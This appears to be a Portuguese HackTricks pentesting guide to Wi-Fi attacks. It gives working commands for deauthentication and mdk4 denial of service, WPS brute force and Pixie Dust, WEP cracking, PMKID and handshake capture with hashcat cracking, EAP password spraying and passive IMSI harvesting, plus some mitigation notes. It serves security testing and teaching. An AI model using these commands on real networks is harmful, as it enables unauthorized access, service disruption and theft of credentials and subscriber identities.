# Pentesting Wifi

{{#include ../../banners/hacktricks-training.md}}

## Comandos básicos de Wifi
```bash
ip link show #List available interfaces
iwconfig #List available interfaces
airmon-ng check kill #Kill annoying processes
airmon-ng start wlan0 #Monitor mode
airmon-ng stop wlan0mon #Managed mode
airodump-ng wlan0mon #Scan (default 2.4Ghz)
airodump-ng wlan0mon --band a #Scan 5Ghz
airodump-ng wlan0mon --wps #Scan WPS
iwconfig wlan0 mode monitor #Put in mode monitor
iwconfig wlan0mon mode managed #Quit mode monitor - managed mode
iw dev wlan0 scan | grep "^BSS\|SSID\|WSP\|Authentication\|WPS\|WPA" #Scan available wifis
iwlist wlan0 scan #Scan available wifis
```
## Ferramentas

### Hijacker & NexMon (Wi-Fi interno do Android)


{{#ref}}
enable-nexmon-monitor-and-injection-on-android.md
{{#endref}}

### EAPHammer
```
git clone https://github.com/s0lst1c3/eaphammer.git
./kali-setup
```
### Airgeddon
```bash
mv `which dhcpd` `which dhcpd`.old
apt install isc-dhcp-server
apt-get install sslstrip asleap bettercap mdk4 hostapd beef-xss lighttpd dsniff hostapd-wpe
```
**Executar airgeddon com docker**
```bash
docker run \
--rm \
-ti \
--name airgeddon \
--net=host \
--privileged \
-p 3000:3000 \
-v /tmp:/io \
-e DISPLAY=$(env | grep DISPLAY | awk -F "=" '{print $2}') \
v1s1t0r1sh3r3/airgeddon
```
Fonte: [https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux](https://github.com/v1s1t0r1sh3r3/airgeddon/wiki/Docker%20Linux)

### wifiphisher

Ele pode realizar ataques Evil Twin, KARMA e Known Beacons e então usar um modelo de phishing para conseguir obter a senha real da network ou capturar credentials de social network.
```bash
git clone https://github.com/wifiphisher/wifiphisher.git # Download the latest revision
cd wifiphisher # Switch to tool's directory
sudo python setup.py install # Install any dependencies
```
### [Wifite2](https://github.com/derv82/wifite2)

This tool automates **WPS/WEP/WPA-PSK** attacks. It will automatically:

- Colocar a interface em monitor mode
- Fazer scan por redes possíveis - E permitir que você selecione a(s) vítima(s)
- Se WEP - Lançar ataques WEP
- Se WPA-PSK
- Se WPS: Pixie dust attack e brute-force attack (cuidado: o brute-force attack pode levar muito tempo). Observe que ele não tenta null PIN ou database/generated PINs.
- Tentar capturar o PMKID do AP para crackear
- Tentar desautenticar clientes do AP para capturar um handshake
- Se PMKID ou handshake, tentar bruteforce usando top5000 passwords.

## Attacks Summary

- **DoS**
- Deauthentication/disassociation -- Desconectar todos (ou um ESSID/Client específico)
- Random fake APs -- Ocultar redes, possível travamento de scanners
- Overload AP -- Tentar derrubar o AP (geralmente não muito útil)
- WIDS -- Testar o IDS
- TKIP, EAPOL -- Alguns ataques específicos para DoS em alguns APs
- **Cracking**
- Crack **WEP** (várias ferramentas e métodos)
- **WPA-PSK**
- **WPS** pin "Brute-Force"
- **WPA PMKID** bruteforce
- \[DoS +] **WPA handshake** capture + Cracking
- **WPA-MGT**
- **Username capture**
- **Bruteforce** Credentials
- **Evil Twin** (with or without DoS)
- **Open** Evil Twin \[+ DoS] -- Útil para capturar captive portal creds e/ou realizar LAN attacks
- **WPA-PSK** Evil Twin -- Útil para network attacks se você souber a password
- **WPA-MGT** -- Útil para capturar company credentials
- **KARMA, MANA**, **Loud MANA**, **Known beacon**
- **+ Open** -- Útil para capturar captive portal creds e/ou realizar LAN attacks
- **+ WPA** -- Útil para capturar WPA handshakes

## Open / OWE networks quick notes

- **Passive capture** on open SSIDs still works with monitor mode and tcpdump:
```bash
iw wlan0 set type monitor
ip link set wlan0 up
iw wlan0 set channel 6
tcpdump -i wlan0 -w capture.pcap
```
- **OWE** (Opportunistic Wireless Encryption) realiza uma troca de chaves por estação (no PSK), então os frames no ar são criptografados mesmo em SSIDs "open". Sendo baseado em WPA3, também aplica **802.11w PMF**, que bloqueia frames de deauth/disassoc forjados.
- OWE **não autentica** joiners: qualquer um pode associar, então **verifique client isolation** em vez de confiar em afirmações de marketing. Sem isolamento, ARP spoofing ou responder-style poisoning no L2 local ainda funciona.
- **Evil Twin** continua viável em SSIDs open/OWE apresentando um sinal mais forte; o PMF apenas remove o atalho de deauth. Se as vítimas aceitarem um certificado TLS forjado, o MitM HTTP(S) completo é restabelecido.
- Broadcast poisoning em guest Wi-Fi open facilmente gera creds/hashes (LLMNR/NBT-NS/mDNS). See:

{{#ref}}
../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## DOS

### Deauthentication Packets

**Descrição retirada de** [**aqui**:](https://null-byte.wonderhowto.com/how-to/use-mdk3-for-advanced-wi-fi-jamming-0185832/)**.**

**Deauthentication** attacks, um método prevalente em Wi-Fi hacking, envolvem forjar frames de "management" para **desconectar forçosamente dispositivos de uma rede**. Esses pacotes não criptografados enganam os clientes, fazendo-os acreditar que vêm da rede legítima, permitindo que atacantes coletem WPA handshakes para cracking ou interrompam persistentemente conexões de rede. Essa tática, alarmante em sua simplicidade, é amplamente usada e tem implicações significativas para a segurança de redes.

**Deauthentication using Aireplay-ng**
```
aireplay-ng -0 0 -a 00:14:6C:7E:40:80 -c 00:0F:B5:34:30:30 ath0
```
- -0 significa deauthentication
- 1 é o número de deauths a enviar (você pode enviar múltiplos se desejar); 0 significa enviá‑los continuamente
- -a 00:14:6C:7E:40:80 é o endereço MAC do ponto de acesso
- -c 00:0F:B5:34:30:30 é o endereço MAC do cliente a ser deauthenticate; se isto for omitido, então é enviada uma broadcast deauthentication (nem sempre funciona)
- ath0 é o nome da interface

### Disassociation Packets

**Disassociation packets**, similar to deauthentication packets, são um tipo de frame de gerenciamento usado em redes Wi‑Fi. Esses pacotes servem para romper a conexão entre um dispositivo (como um laptop ou smartphone) e um ponto de acesso (AP). A principal distinção entre disassociation e deauthentication está nos cenários de uso. Enquanto um AP emite **deauthentication packets to remove rogue devices explicitly from the network, disassociation packets are typically sent when the AP is undergoing a shutdown**, reinício ou realocação, exigindo assim a desconexão de todos os nós conectados.

**Este ataque pode ser realizado por mdk4(mode "d"):**
```bash
# -c <channel>
# -b victim_client_mac.txt contains the MAC address of the device to eliminate
# -e WifiName is the name of the wifi
# -B BSSID is the BSSID of the AP
# Notice that these and other parameters aare optional, you could give onli the ESSID and md4k will automatically search for it, wait for finding clients and deauthenticate them
mdk4 wlan0mon d -c 5 -b victim_client_mac.txt -E WifiName -B EF:60:69:D7:69:2F
```
### **Mais ataques DOS por mdk4**

**Em** [**here**](https://en.kali.tools/?p=864)**.**

**ATTACK MODE b: Beacon Flooding**

Envia beacon frames para mostrar fake APs aos clientes. Isso às vezes pode travar network scanners e até drivers!
```bash
# -a Use also non-printable caracters in generated SSIDs and create SSIDs that break the 32-byte limit
# -w n (create Open) t (Create WPA/TKIP) a (Create WPA2/AES)
# -m use real BSSIDS
# All the parameters are optional and you could load ESSIDs from a file
mdk4 wlan0mon b -a -w nta -m
```
**ATTACK MODE a: Authentication Denial-Of-Service**

Enviar authentication frames para todos os Access Points (APs) acessíveis ao alcance pode sobrecarregar esses APs, especialmente quando numerosos clientes estão envolvidos. Esse tráfego intenso pode levar à instabilidade do sistema, fazendo com que alguns APs travem ou até reiniciem.
```bash
# -a BSSID send random data from random clients to try the DoS
# -i BSSID capture and repeat pakets from authenticated clients
# -m use real MACs
# only -a or -i can be used
mdk4 wlan0mon a [-i EF:60:69:D7:69:2F] [-a EF:60:69:D7:69:2F] -m
```
**ATTACK MODE p: SSID Probing and Bruteforcing**

Probing Access Points (APs) verifica se um SSID é exibido corretamente e confirma o alcance do AP. Essa técnica, juntamente com **bruteforcing hidden SSIDs** com ou sem uma wordlist, auxilia na identificação e no acesso a redes ocultas.

**ATTACK MODE m: Michael Countermeasures Exploitation**

Enviar packets aleatórios ou duplicados para diferentes filas de QoS pode disparar Michael Countermeasures em **TKIP APs**, levando ao desligamento do AP por um minuto. Este método é uma tática eficiente de **DoS** (Denial of Service).
```bash
# -t <BSSID> of a TKIP AP
# -j use inteligent replay to create the DoS
mdk4 wlan0mon m -t EF:60:69:D7:69:2F [-j]
```
**ATTACK MODE e: EAPOL Start and Logoff Packet Injection**

Inundar um AP com **EAPOL Start frames** cria **fake sessions**, sobrecarregando o AP e bloqueando clientes legítimos. Alternativamente, injetar **fake EAPOL Logoff messages** desconecta clientes à força; ambos os métodos interrompem efetivamente o serviço de rede.
```bash
# Use Logoff messages to kick clients
mdk4 wlan0mon e -t EF:60:69:D7:69:2F [-l]
```
**ATTACK MODE s: Ataques para redes mesh IEEE 802.11s**

Vários ataques ao gerenciamento de links e ao roteamento em redes mesh.

**ATTACK MODE w: Confusão do WIDS**

Conectar clientes a múltiplos nós WDS ou rogue APs falsos pode manipular Sistemas de Detecção e Prevenção de Intrusões, gerando confusão e potencial abuso do sistema.
```bash
# -z activate Zero_Chaos' WIDS exploit (authenticates clients from a WDS to foreign APs to make WIDS go nuts)
mkd4 -e <SSID> -c <channel> [-z]
```
**ATTACK MODE f: Packet Fuzzer**

Uma Packet Fuzzer com diversas fontes de pacotes e um conjunto abrangente de modificadores para manipulação de pacotes.

### **Airggedon**

_**Airgeddon**_ oferece a maioria dos ataques propostos nos comentários anteriores:

![](<../../images/image (95).png>)

## WPS

WPS (Wi‑Fi Protected Setup) simplifica o processo de conectar dispositivos a um roteador, acelerando e facilitando a configuração para redes criptografadas com **WPA** ou **WPA2** Personal. Não é eficaz contra a segurança **WEP**, que é facilmente comprometida. O WPS usa um PIN de 8 dígitos, validado em duas metades, tornando-o suscetível a ataques de **brute-force** devido ao número limitado de combinações (11.000 possibilidades).

### WPS Bruteforce

Existem 2 ferramentas principais para realizar essa ação: Reaver e Bully.

- **Reaver** foi projetado para ser um ataque robusto e prático contra WPS, e foi testado em uma ampla variedade de access points e implementações WPS.
- **Bully** é uma **nova implementação** do ataque de brute force ao WPS, escrito em C. Ele tem várias vantagens sobre o código original do reaver: menos dependências, melhor desempenho de memória e CPU, tratamento correto de endianness e um conjunto de opções mais robusto.

O ataque explora a **vulnerabilidade do WPS PIN**, particularmente a exposição dos primeiros quatro dígitos e o papel do último dígito como checksum, facilitando o ataque de **brute-force**. Contudo, defesas contra brute-force, como **bloqueio de MAC addresses** de atacantes agressivos, exigem **MAC address rotation** para continuar o ataque.

Ao obter o WPS PIN com ferramentas como Bully ou Reaver, o atacante pode deduzir o PSK do **WPA/WPA2**, garantindo **acesso persistente à rede**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -b -f -N [-L -d 2] -vvroot
bully wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -S -F -B -v 3
```
**Smart Brute Force**

Esta abordagem refinada tem como alvo os WPS PINs usando vulnerabilidades conhecidas:

1. **PINs pré-descobertos**: Utilize um banco de dados de PINs conhecidos vinculados a fabricantes específicos conhecidos por usar WPS PINs uniformes. Esse banco de dados correlaciona os três primeiros octetos dos MAC-addresses com os PINs prováveis desses fabricantes.
2. **Algoritmos de geração de PINs**: Aproveite algoritmos como ComputePIN e EasyBox, que calculam WPS PINs com base no MAC-address do AP. O algoritmo Arcadyan, adicionalmente, requer um device ID, adicionando uma camada ao processo de geração do PIN.

### WPS Pixie Dust attack

**Dominique Bongard** descobriu uma falha em alguns Access Points (APs) relacionada à criação de códigos secretos, conhecidos como nonces (E-S1 e E-S2). Se esses nonces puderem ser descobertos, o cracking do WPS PIN do AP torna-se fácil. O AP revela o PIN dentro de um código especial (hash) para provar que é legítimo e não um AP falso (rogue). Esses nonces são essencialmente as "chaves" para destrancar o "cofre" que contém o WPS PIN. Mais sobre isso pode ser encontrado [here](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>).

Em termos simples, o problema é que alguns APs não usavam chaves suficientemente aleatórias para criptografar o PIN durante o processo de conexão. Isso torna o PIN vulnerável a ser adivinhado a partir de fora da rede (offline brute force attack).
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -K 1 -N -vv
bully  wlan1mon -b 00:C0:CA:78:B1:37 -d -v 3
```
Se você não quiser colocar o dispositivo em monitor mode, ou se `reaver` e `bully` apresentarem algum problema, pode tentar [OneShot-C](https://github.com/nikita-yfh/OneShot-C). Esta ferramenta pode executar o Pixie Dust attack sem precisar entrar em monitor mode.
```bash
./oneshot -i wlan0 -K -b 00:C0:CA:78:B1:37
```
### Null Pin attack

Alguns sistemas mal projetados até permitem que um **Null PIN** (um PIN vazio ou inexistente) conceda acesso, o que é bastante incomum. A ferramenta **Reaver** é capaz de testar essa vulnerabilidade, ao contrário do **Bully**.
```bash
reaver -i wlan1mon -b 00:C0:CA:78:B1:37 -c 9 -f -N -g 1 -vv -p ''
```
### Airgeddon

Todos os ataques WPS propostos podem ser facilmente executados usando _**airgeddon.**_

![](<../../images/image (219).png>)

- 5 e 6 permitem que você tente **seu PIN personalizado** (se tiver algum)
- 7 e 8 executam o **Pixie Dust attack**
- 13 permite testar o **NULL PIN**
- 11 e 12 irão **recolher os PINs relacionados ao AP selecionado a partir de bases de dados disponíveis** e **gerar** possíveis **PINs** usando: ComputePIN, EasyBox e, opcionalmente, Arcadyan (recomendado, por que não?)
- 9 e 10 vão testar **todos os PINs possíveis**

## **WEP**

**Por que ele falha**

- RC4 seed é apenas **IV (24 bits) + shared key**. O IV está em cleartext, é pequeno (2^24) e se repete rapidamente, então ciphertexts com o mesmo IV reutilizam o keystream.
- XORing two ciphertexts with the same keystream leaks `PlaintextA ⊕ PlaintextB`; predictable headers + RC4 KSA biases (**FMS**) permitem “votar” bytes da chave. **PTW** otimiza isso usando ARP traffic para reduzir os requisitos para dezenas de milhares de packets em vez de milhões.
- Integridade é apenas **CRC32** (linear/unkeyed), então um atacante pode flipar bits e recomputar CRC32 sem a chave → packet forgery/replay/ARP injection enquanto espera pelos IVs.

A quebra prática é determinística:
```bash
airodump-ng --bssid <BSSID> --channel <ch> --write wep_capture wlan1mon  # collect IVs
# optionally speed up IVs without deauth by replaying ARP
aireplay-ng --arpreplay -b <BSSID> -h <clientMAC> wlan1mon
aircrack-ng wep_capture-01.cap  # PTW attack recovers key once IV threshold is met
```
Airgeddon ainda inclui um fluxo de trabalho WEP "All-in-One" se você preferir uma UI guiada.

![](<../../images/image (432).png>)

---

---

## WPA/WPA2 PSK

### PMKID

Em 2018, **hashcat** [revealed](https://hashcat.net/forum/thread-7717.html) um novo método de ataque, único porque precisa apenas de **um único pacote** e não requer que quaisquer clientes estejam conectados ao AP alvo — apenas interação entre o atacante e o AP.

Muitos roteadores modernos adicionam um **campo opcional** ao **primeiro quadro EAPOL** durante a associação, conhecido como `Robust Security Network`. Isso inclui o `PMKID`.

Como o post original explica, o **PMKID** é criado usando dados conhecidos:
```bash
PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)
```
Dado que o "PMK Name" é constante, sabemos o BSSID do AP e da station, e o `PMK` é idêntico ao do full 4-way handshake, o **hashcat** pode usar essa informação para crackar o PSK e recuperar a passphrase!

Para **gather** essa informação e **bruteforce** localmente a senha você pode fazer:
```bash
airmon-ng check kill
airmon-ng start wlan0
git clone https://github.com/ZerBea/hcxdumptool.git; cd hcxdumptool; make; make install
hcxdumptool -o /tmp/attack.pcap -i wlan0mon --enable_status=1
```

```bash
#You can also obtains PMKIDs using eaphammer
./eaphammer --pmkid --interface wlan0 --channel 11 --bssid 70:4C:A5:F8:9A:C1
```
Os **PMKIDs captured** serão exibidos no **console** e também salvos dentro \_ **/tmp/attack.pcap**\_\
Agora, converta a captura para o formato **hashcat/john** e crack it:
```bash
hcxtools/hcxpcaptool -z hashes.txt /tmp/attack.pcapng
hashcat -m 16800 --force hashes.txt /usr/share/wordlists/rockyou.txt
john hashes.txt --wordlist=/usr/share/wordlists/rockyou.txt
```
Observe que o formato de um hash correto contém **4 partes**, como: `4017733ca8db33a1479196c2415173beb808d7b83cfaa4a6a9a5aae7566f6461666f6e65436f6e6e6563743034383131343838` Se o seu **contiver somente** **3 partes**, então é **inválido** (a captura PMKID não foi válida).

Note que `hcxdumptool` **também captura handshakes** (algo assim aparecerá: **`MP:M1M2 RC:63258 EAPOLTIME:17091`**). Você pode **transformar** os **handshakes** para o formato **hashcat**/**john** usando `cap2hccapx`
```bash
tcpdump -r /tmp/attack.pcapng -w /tmp/att.pcap
cap2hccapx pmkid.pcapng pmkid.hccapx ["Filter_ESSID"]
hccap2john pmkid.hccapx > handshake.john
john handshake.john --wordlist=/usr/share/wordlists/rockyou.txt
aircrack-ng /tmp/att.pcap -w /usr/share/wordlists/rockyou.txt #Sometimes
```
_Percebi que alguns handshakes capturados com esta ferramenta não puderam ser cracked mesmo sabendo a senha correta. Recomendo capturar handshakes também pela forma tradicional, se possível, ou capturar vários deles usando esta ferramenta._

### Captura de handshake

Um ataque a redes **WPA/WPA2** pode ser executado capturando um **handshake** e tentando **crack** a senha **offline**. Esse processo envolve monitorar a comunicação de uma rede específica e o **BSSID** em um **channel** particular. Aqui está um guia simplificado:

1. Identifique o **BSSID**, o **channel**, e um **connected client** da rede alvo.
2. Use `airodump-ng` para monitorar o tráfego da rede no **channel** e **BSSID** especificados, na esperança de capturar um **handshake**. O comando ficará assim:
```bash
airodump-ng wlan0 -c 6 --bssid 64:20:9F:15:4F:D7 -w /tmp/psk --output-format pcap
```
3. Para aumentar a chance de capturar um handshake, desconecte momentaneamente o cliente da rede para forçar uma re-autenticação. Isso pode ser feito usando o comando `aireplay-ng`, que envia deauthentication packets ao cliente:
```bash
aireplay-ng -0 0 -a 64:20:9F:15:4F:D7 wlan0 #Send generic deauth packets, may not work in all scenarios
```
_Observe que, como o client foi deauthenticated, ele pode tentar conectar-se a um AP diferente ou, em outros casos, a uma network diferente._

Quando no `airodump-ng` aparecerem informações de handshake, isso significa que o handshake foi capturado e você pode parar de listening:

![](<../../images/image (172) (1).png>)

Depois que o handshake for capturado, você pode **crack** ele com `aircrack-ng`:
```
aircrack-ng -w /usr/share/wordlists/rockyou.txt -b 64:20:9F:15:4F:D7 /tmp/psk*.cap
```
### Verificar se há handshake no arquivo

**aircrack**
```bash
aircrack-ng psk-01.cap #Search your bssid/essid and check if any handshake was capture
```
**tshark**
```bash
tshark -r psk-01.cap -n -Y eapol #Filter handshake messages #You should have the 4 messages.
```
[**cowpatty**](https://github.com/roobixx/cowpatty)
```
cowpatty -r psk-01.cap -s "ESSID" -f -
```
_Se esta ferramenta encontrar um handshake incompleto de um ESSID antes do handshake completo, ela não detectará o válido._

**pyrit**
```bash
apt-get install pyrit #Not working for newer versions of kali
pyrit -r psk-01.cap analyze
```
#### Adivinhação online de PSK mais rápida via `wpa_supplicant` ctrl socket (no clients/PMKID)

Quando não há clients por perto e o AP recusa PMKID, você pode iterar PSKs online sem respawning de supplicants:

- Aplique um patch em `wpa_supplicant.c` para forçar `dur = 0;` na lógica de backoff de falha de autenticação (em torno de `ssid->auth_failures`), desabilitando efetivamente o temporizador temporary-disable.
- Execute um único daemon com um control socket:
```bash
# wpa_supplicant.conf
ctrl_interface=DIR=/var/run/wpa_supplicant GROUP=root
update_config=1

wpa_supplicant -B -i wlp3s0 -c wpa_supplicant.conf
```
- Controle-o via a interface de controle, reutilizando o mesmo scan e network:
```text
ADD_NETWORK
SET_NETWORK 0 ssid "<ssid>"
ENABLE_NETWORK 0
SCAN
(loop)
SET_NETWORK 0 psk "<candidate>"
REASSOCIATE
wait for CTRL-EVENT-CONNECTED / DISCONNECTED
```
Um pequeno loop em Python que lê eventos de socket (`CTRL-EVENT-CONNECTED` / `CTRL-EVENT-DISCONNECTED`) pode testar ~100 tentativas em ~5 minutos sem a sobrecarga de scan. Ainda é ruidoso e detectável, mas evita reinicializações de processo por tentativa e atrasos de backoff.

## **WPA Enterprise (MGT)**

In **enterprise WiFi setups, you'll encounter various authentication methods**, each providing different security levels and management features. When you use tools like `airodump-ng` to inspect network traffic, you might notice identifiers for these authentication types. Some common methods include:
```
6A:FE:3B:73:18:FB  -58       19        0    0   1  195  WPA2 CCMP   MGT  NameOfMyWifi
```
1. **EAP-GTC (Generic Token Card)**:
- Este método suporta hardware tokens e one-time passwords dentro de EAP-PEAP. Ao contrário do MSCHAPv2, ele não utiliza peer challenge e envia passwords em plaintext para o access point, representando um risco para downgrade attacks.
2. **EAP-MD5 (Message Digest 5)**:
- Envolve o envio do hash MD5 do password a partir do client. Não é **recomendado** devido à vulnerabilidade a dictionary attacks, falta de server authentication e incapacidade de gerar WEP keys específicas por sessão.
3. **EAP-TLS (Transport Layer Security)**:
- Utiliza certificados client-side e server-side para authentication e pode gerar dinamicamente WEP keys por usuário e por sessão para proteger as comunicações.
4. **EAP-TTLS (Tunneled Transport Layer Security)**:
- Fornece mutual authentication através de um TLS tunnel encriptado, além de um método para derivar WEP keys dinâmicas por usuário e por sessão. Requer apenas certificados server-side, com clients usando credentials.
5. **PEAP (Protected Extensible Authentication Protocol)**:
- Funciona de forma similar ao EAP criando um TLS tunnel para comunicação protegida. Permite o uso de protocolos de authentication mais fracos sobre o EAP devido à proteção oferecida pelo tunnel.
- **PEAP-MSCHAPv2**: Frequentemente referido como PEAP, combina o vulnerável mecanismo challenge/response do MSCHAPv2 com um TLS tunnel protetor.
- **PEAP-EAP-TLS (or PEAP-TLS)**: Similar ao EAP-TLS, mas inicia um TLS tunnel antes de trocar certificados, oferecendo uma camada adicional de segurança.

Você pode encontrar mais informações sobre esses métodos de autenticação [here ](https://en.wikipedia.org/wiki/Extensible_Authentication_Protocol)and [here](https://www.intel.com/content/www/us/en/support/articles/000006999/network-and-i-o/wireless-networking.html).

### Captura de username

Lendo [https://tools.ietf.org/html/rfc3748#page-27](https://tools.ietf.org/html/rfc3748#page-27) parece que se você estiver usando **EAP** as **"Identity"** **messages** devem ser **supported**, e o **username** será enviado em **claro** nas **"Response Identity"** messages.

Mesmo usando um dos métodos de autenticação mais seguros: **PEAP-EAP-TLS**, é possível **capturar o username enviado no EAP protocol**. Para isso, **capture uma comunicação de authentication** (start `airodump-ng` inside a channel and `wireshark` in the same interface) e filtre os pacotes por`eapol`.\
Inside the "**Response, Identity**" packet, the **username** of the client will appear.

![](<../../images/image (850).png>)

### Identidades Anônimas

Identity hiding é suportado por ambos EAP-PEAP e EAP-TTLS. No contexto de uma rede WiFi, um EAP-Identity request é tipicamente iniciado pelo access point (AP) durante o processo de association. Para garantir a proteção do anonimato do usuário, a resposta do EAP client no dispositivo do usuário contém apenas a informação essencial requerida para o RADIUS server inicial processar o pedido. Esse conceito é ilustrado através dos seguintes cenários:

- EAP-Identity = anonymous
- Nesse cenário, todos os usuários empregam o pseudônimo "anonymous" como seu identificador de usuário. O RADIUS server inicial funciona como um EAP-PEAP ou EAP-TTLS server, responsável por gerenciar o lado server do protocolo PEAP ou TTLS. O método de autenticação inner (protected) é então tratado localmente ou delegado a um RADIUS server remoto (home).
- EAP-Identity = anonymous@realm_x
- Nesta situação, usuários de diferentes realms ocultam suas identities enquanto indicam seus respectivos realms. Isso permite que o RADIUS server inicial proxy os pedidos EAP-PEAP ou EAP-TTLS para RADIUS servers em seus home realms, que atuam como o PEAP ou TTLS server. O RADIUS server inicial opera exclusivamente como um RADIUS relay node.
- Alternativamente, o RADIUS server inicial pode funcionar como o EAP-PEAP ou EAP-TTLS server e ou tratar o método de autenticação protegido localmente ou encaminhá-lo para outro server. Esta opção facilita a configuração de políticas distintas para vários realms.

No EAP-PEAP, uma vez que o TLS tunnel é estabelecido entre o PEAP server e o PEAP client, o PEAP server inicia um EAP-Identity request e o transmite através do TLS tunnel. O client responde a esse segundo EAP-Identity request enviando uma EAP-Identity response contendo a identidade real do usuário através do tunnel encriptado. Essa abordagem previne efetivamente a revelação da identidade real do usuário a qualquer pessoa eavesdropping no tráfego 802.11.

EAP-TTLS segue um procedimento ligeiramente diferente. Com EAP-TTLS, o client tipicamente autentica usando PAP ou CHAP, protegido pelo TLS tunnel. Neste caso, o client inclui um User-Name attribute e ou um Password ou CHAP-Password attribute na mensagem TLS inicial enviada após o estabelecimento do tunnel.

Independentemente do protocolo escolhido, o PEAP/TTLS server obtém conhecimento da identidade real do usuário após o TLS tunnel ter sido estabelecido. A identidade real pode ser representada como user@realm ou simplesmente user. Se o PEAP/TTLS server também for responsável por autenticar o usuário, ele agora possui a identidade do usuário e prossegue com o método de autenticação protegido pelo TLS tunnel. Alternativamente, o PEAP/TTLS server pode encaminhar um novo pedido RADIUS para o home RADIUS server do usuário. Esse novo RADIUS request omite a camada PEAP ou TTLS do protocolo. Nos casos em que o método de autenticação protegido é EAP, as inner EAP messages são transmitidas ao home RADIUS server sem o wrapper EAP-PEAP ou EAP-TTLS. O User-Name attribute da mensagem RADIUS de saída contém a identidade real do usuário, substituindo o User-Name anonymous do RADIUS request de entrada. Quando o método de autenticação protegido é PAP ou CHAP (suportado apenas pelo TTLS), o User-Name e outros atributos de autenticação extraídos do payload TLS são substituídos na mensagem RADIUS de saída, deslocando o User-Name anonymous e os TTLS EAP-Message attributes encontrados no RADIUS request de entrada.

For more info check [https://www.interlinknetworks.com/app_notes/eap-peap.htm](https://www.interlinknetworks.com/app_notes/eap-peap.htm)

### SIM-based EAP (EAP-SIM/EAP-AKA) identity leakage (IMSI exposure)

SIM-based Wi‑Fi authentication using EAP‑SIM/EAP‑AKA over 802.1X can leak the permanent subscriber identifier (IMSI) in cleartext during the unauthenticated identity phase if the deployment doesn’t implement pseudonyms/protected identities or a TLS tunnel around the inner EAP.

Where the leak happens (high level):
- 802.11 association completes to the SSID (often carrier offload SSIDs like FreeWifi_secure, eduroam-like operator realms, etc.).
- Authenticator sends EAP-Request/Identity.
- Vulnerable clients answer EAP-Response/Identity with their permanent identity = IMSI encoded as a 3GPP NAI, prior to any protection.
- Example NAI: 20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
- Anyone passively listening to RF can read that frame. No 4-way handshake or TLS keying is needed.

Quick PoC: passive IMSI harvesting on EAP‑SIM/AKA networks lacking identity privacy
<details>
<summary>Clique para expandir</summary>
```bash
# 1) Enable monitor mode
airmon-ng start wlan0

# 2) Optional: lock channel to the target BSS
airodump-ng wlan0mon --essid <SSID>

# 3) Capture 802.1X/EAP frames
# Wireshark display filters:
#   eap || eapol
#   (identity specifically): eap.code == 2 && eap.type == 1
# Kismet: add source wlan0mon; enable 802.1X/EAP views
# tcpdump (pcap capture):
#   tcpdump -i wlan0mon -s 0 -w eapsim_identity.pcap

# 4) Wait for a device to auto-connect to the SSID
# 5) Inspect the first EAP-Response/Identity frame
# Expected: ASCII NAI containing IMSI, e.g.
#   20815XXXXXXXXXX@wlan.mnc015.mcc208.3gppnetwork.org
```
</details>

Notas:
- Funciona antes de qualquer túnel TLS se a implantação usar bare EAP‑SIM/AKA sem identidade/pseudônimos protegidos.
- O valor exposto é um identificador permanente vinculado ao SIM do assinante; a colheita permite rastreamento de longo prazo e abusos subsequentes em telecom.

Impacto
- Privacidade: rastreamento persistente de usuário/dispositivo a partir de capturas passivas de Wi‑Fi em locais públicos.
- Base para abuso em telecom: com o IMSI, um atacante com acesso SS7/Diameter pode consultar localização ou tentar interceptação de chamadas/SMS e roubo de MFA.

Mitigações / o que procurar
- Verifique que os clientes usam identidades externas anônimas (pseudônimos) para EAP‑SIM/AKA conforme a orientação 3GPP (por exemplo, 3GPP TS 33.402).
- Prefira tunelizar a fase de identidade (por exemplo, EAP‑TTLS/PEAP carregando EAP‑SIM/AKA interno) para que o IMSI nunca seja enviado em claro.
- Capturas de pacotes da associação/autenticação nunca devem revelar um IMSI bruto em EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

If the client is expected to use a **username and password** (notice that **EAP-TLS won't be valid** in this case), then you could try to get a **list** de **usernames** (see next part) and **passwords** and try to **bruteforce** the access using [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer)**.**
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Você também pode realizar este attack usando `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria de ataques a clientes

### Seleção de rede e roaming

- O protocolo 802.11 define como uma station se junta a um Extended Service Set (ESS) mas não especifica os critérios para selecionar um ESS ou um access point (AP) dentro dele.
- Stations podem fazer roaming entre APs que compartilham o mesmo ESSID, mantendo a conectividade ao longo de um prédio ou área.
- O protocolo exige a autenticação da station ao ESS, mas não obriga a autenticação do AP para a station.

### Preferred Network Lists (PNLs)

- Stations armazenam o ESSID de cada rede wireless à qual se conectam em sua Preferred Network List (PNL), junto com detalhes de configuração específicos da rede.
- A PNL é usada para conectar automaticamente a redes conhecidas, melhorando a experiência do usuário ao simplificar o processo de conexão.

### Passive Scanning

- APs broadcastam periodicamente beacon frames, anunciando sua presença e features, incluindo o ESSID do AP a menos que o broadcast esteja desativado.
- Durante o passive scanning, stations escutam por beacon frames. Se o ESSID de um beacon corresponder a uma entrada na PNL da station, a station pode conectar-se automaticamente àquele AP.
- O conhecimento do PNL de um dispositivo permite exploração potencial ao mimetizar o ESSID de uma rede conhecida, enganando o dispositivo para conectar-se a um rogue AP.

### Active Probing

- Active probing envolve stations enviando probe requests para descobrir APs próximos e suas características.
- Directed probe requests têm como alvo um ESSID específico, ajudando a detectar se uma rede particular está ao alcance, mesmo que seja uma rede oculta.
- Broadcast probe requests possuem o campo SSID nulo e são enviadas para todos os APs próximos, permitindo que a station verifique qualquer rede preferida sem divulgar o conteúdo do seu PNL.

## Simple AP with redirection to Internet

